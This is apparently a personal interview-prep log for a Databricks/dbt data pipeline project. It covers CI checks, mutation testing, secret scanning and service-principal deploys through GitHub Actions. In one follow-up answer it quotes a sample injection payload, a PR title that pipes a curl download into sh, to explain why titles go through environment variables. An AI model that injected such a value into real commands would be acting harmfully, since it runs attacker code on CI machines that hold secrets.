# Interview log

One entry per ticket, written before you close it.

## Ticket NN: title

- **Decision:**
- **Rejected alternative and why:**
- **Impact (numbers where you can):**
- **Hardest moment and how you got past it:**

## Ticket 01: Repo skeleton and CI gates

- **Decision:** Every change to the pipeline has to pass 13 automated checks before it can merge, and they run before anything touches Databricks. They cover SQL style (sqlfluff), Python bugs and types, tests, leaked credentials and vulnerable dependencies. Each check is its own job, so a red check says exactly which rule broke. On a data team, a bad dbt model doesn't fail loudly: it writes wrong numbers into a Gold table that a dashboard reads. Catching it at the PR is the cheapest place to stop it.
- **Rejected alternative and why:** I could have relied on code review alone and added checks later. Reviewers miss mechanical things like an inconsistently formatted model, an unpinned dependency or a pasted warehouse token, and the checks cost nothing to run on a public repo. I also rejected one big CI job: when a single job fails, you have to read the logs to find out why.
- **Impact (numbers where you can):** The gates are 13 checks and 31 tests, with coverage at 93% (floor 90) and a mutation score of 90.5% (19 of 21 deliberate bugs caught, floor 85). The dependency audit found 0 known vulnerabilities across 132 locked packages. A planted fake API key was caught by gitleaks (1 leak found, PR blocked). The full suite runs in a few minutes on every PR.
- **Hardest moment and how you got past it:** The SQL linter hung forever in CI. sqlfluff's dbt templater renders each model through dbt, and dbt-databricks opens a real warehouse connection to do it, so with placeholder credentials it waited indefinitely. A stack dump showed it stuck building dbt's relation cache. For now the lint passes because there are no models yet. Once models land, the lint job will need dev warehouse credentials. The other option is the plain Jinja templater, which needs no connection but renders macros less faithfully.

### Likely follow-up questions

- **Why does a data engineer care about CI?** dbt models are code that produces data. A broken model in production means wrong numbers in reports, and a backfill to fix them. Linting and testing at the PR is much cheaper than a data incident.
- **What's mutation testing?** The tool deliberately breaks the code, for example flipping `==` to `!=`, and checks whether a test fails. If no test fails, the tests aren't really checking that line. Coverage only says a line ran; mutation testing says a test would notice if it were wrong.
- **Why pin actions and dependencies to exact versions?** Reproducibility. The same commit should build the same way next month. It's the same idea as pinning a dbt package version so a model's output doesn't change underneath you. Pinning GitHub Actions to a commit SHA also stops a compromised tag from running someone else's code with access to your secrets.
- **Why pass the PR title through `env:`?** Anyone who opens a PR controls its title. Pasted straight into a shell command, a title like `"; curl evil.sh | sh` would run. As an environment variable it is only ever treated as text.
- **Why a lock file (`uv.lock`) and `--locked`?** The lock file records every package version. `--locked` fails CI if the lock file is out of date, so the versions audited are the versions that actually run.
- **What would you improve?** gitleaks-action only scans the commits the PR's commits API lists, so running the gitleaks binary over the full commit range would close that gap. Bundle validation waits for the Databricks workspace in ticket 02.

## Ticket 02: Free Edition proof (catalogs, service principals, CI deploy)

- **Decision:** Every deploy to staging and prod runs from GitHub Actions as a per-environment service principal using OAuth machine-to-machine credentials, defined as a Databricks Asset Bundle. Merging to `main` deploys to staging; prod waits for my approval in a protected GitHub Environment and deploys the same commit. Each principal only has write grants on its own catalog, so a staging credential cannot touch prod data even if it leaks.
- **Rejected alternative and why:** A personal access token in a repo secret, deployed with my own identity. It is quicker to set up, but every deploy would run as me with all my permissions, it would break if my account went away, and there is no per-environment separation. I also rejected one shared principal for both environments: one leaked secret would expose prod.
- **Impact (numbers where you can):** 3 catalogs, 2 deploy principals, 2 GitHub Environments with 3 secrets each, and 1 required reviewer. Secrets expire after 90 days and rotate with zero downtime (up to 5 active secrets per principal). The bootstrap doc reduces the manual setup to a fixed list of one-time steps; everything else is code.
- **Hardest moment and how you got past it:** The hello job passed every test locally but failed on Databricks with `SystemExit: 0`. Serverless runs Python tasks inside an IPython session, where `sys.exit()` raises an exception even with a success code, so Databricks marked a successful run as failed. The fix was to call `sys.exit` only for non-zero codes. Before that, the first run failed with a one-off 403 from Databricks' storage layer; checking the file through the API showed it had uploaded correctly, and a re-run passed that step.

### Likely follow-up questions

- **What is a service principal?** A non-human identity for automation. It has its own permissions and credentials, so deploys don't depend on a person's account, and access can be limited to exactly what the pipeline needs.
- **Why OAuth secrets over a personal token?** They belong to the principal not a person, they expire, they can be rotated without downtime, and their access is limited by Unity Catalog grants.
- **How is prod protected?** Three layers: prod only runs after staging succeeds (`needs: staging`), it waits for a required reviewer in the `prod` GitHub Environment, and only that job can read the prod secrets.
- **Development vs production bundle mode?** Development mode prefixes resources with your name, pauses schedules and deploys into your home folder, so experiments don't collide. Production mode deploys unprefixed resources to a shared path and expects a stable identity via `run_as`.
- **Why pin `databricks/setup-cli` to a SHA?** A tag can be moved to different code; a SHA cannot. The deploy job holds prod credentials, so it must only run code I've reviewed. Renovate (ticket 17) proposes updates as PRs.
- **What would you improve?** Restrict the shared bundle folder so only the deploy principals can write to it, and add a scheduled check that each principal can still log in, so an expired secret is caught before release day.
